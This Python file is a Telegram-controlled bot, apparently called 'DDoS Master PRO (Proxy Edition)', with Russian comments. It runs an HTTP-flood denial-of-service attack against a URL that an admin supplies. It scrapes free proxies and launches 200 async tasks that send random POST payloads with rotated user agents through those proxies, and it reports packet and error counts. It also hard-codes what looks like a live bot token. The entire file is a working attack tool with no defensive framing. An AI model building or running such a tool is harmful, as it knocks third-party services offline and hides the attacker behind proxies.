import asyncio
import threading
import socket
import random
import requests
import time
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8525950548:AAFq8AHsHqt6gCkcVzVkMv4XMDJeg1sSjdY"
ADMIN_IDS = [8321796783]

bot = Bot(token=TOKEN)
dp = Dispatcher()

is_attacking = False
packets_sent = 0
errors = 0
PROXIES = [] # Список прокси

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1"
]

# --- ФУНКЦИЯ ЗАГРУЗКИ ПРОКСИ ---
async def fetch_proxies():
    global PROXIES
    try:
        # Загружаем бесплатные HTTP прокси
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                text = await resp.text()
                PROXIES = [f"http://{p.strip()}" for p in text.splitlines() if p.strip()]
        return len(PROXIES)
    except Exception as e:
        print(f"Ошибка загрузки прокси: {e}")
        return 0

# --- МЕТОДЫ АТАКИ ---

async def async_http_attack(url):
    global packets_sent, errors

    # Создаем одну сессию на поток для экономии ресурсов
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        while is_attacking:
            proxy = random.choice(PROXIES) if PROXIES else None
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                payload = {"data": random._urandom(512).hex()}

                # Запрос через прокси (если они есть)
                async with session.post(url, headers=headers, data=payload, proxy=proxy, timeout=3) as response:
                    packets_sent += 1
            except:
                errors += 1
            await asyncio.sleep(0.01) # Минимальная пауза для стабильности

# --- ОБРАБОТЧИКИ ТЕЛЕГРАМ ---

@dp.message(Command("start"))
async def cmd_start(m: types.Message):
    if m.from_user.id not in ADMIN_IDS: return

    kb = [[types.KeyboardButton(text="📊 СТАТУС")], [types.KeyboardButton(text="🛑 ОСТАНОВИТЬ")]]
    markup = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

    await m.answer(
        "🚀 **DDoS Master PRO (Proxy Edition)**\n\n"
        "• `/http url` — Атака через прокси\n"
        "• `/update` — Обновить список прокси",
        reply_markup=markup
    )

@dp.message(Command("update"))
async def cmd_update(m: types.Message):
    count = await fetch_proxies()
    await m.answer(f"✅ Прокси обновлены! Загружено: `{count}` шт.")

@dp.message(Command("http"))
async def start_http(m: types.Message):
    global is_attacking
    if m.from_user.id not in ADMIN_IDS: return

    url = m.text.replace("/http ", "").strip()
    if not url.startswith("http"): return await m.answer("Укажите URL!")

    if not PROXIES:
        await m.answer("⏳ Прокси не загружены. Загружаю...")
        await fetch_proxies()

    is_attacking = True
    await m.answer(f"🔥 **ЗАПУСК**\nЦель: {url}\nПрокси: `{len(PROXIES)}` активны.")

    for _ in range(200): # Уменьшил до 200, т.к. прокси замедляют процесс
        asyncio.create_task(async_http_attack(url))

@dp.message(F.text == "📊 СТАТУС")
async def h_status(m: types.Message):
    await m.answer(f"📈 Пакеты: `{packets_sent}`\n❌ Ошибки: `{errors}`\n🌐 Прокси: `{len(PROXIES)}`")

@dp.message(F.text == "🛑 ОСТАНОВИТЬ")
async def stop_all(m: types.Message):
    global is_attacking, packets_sent, errors
    is_attacking = False
    packets_sent = 0
    errors = 0
    await m.answer("🛑 Остановлено.")

async def main():
    await fetch_proxies() # Предварительная загрузка
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())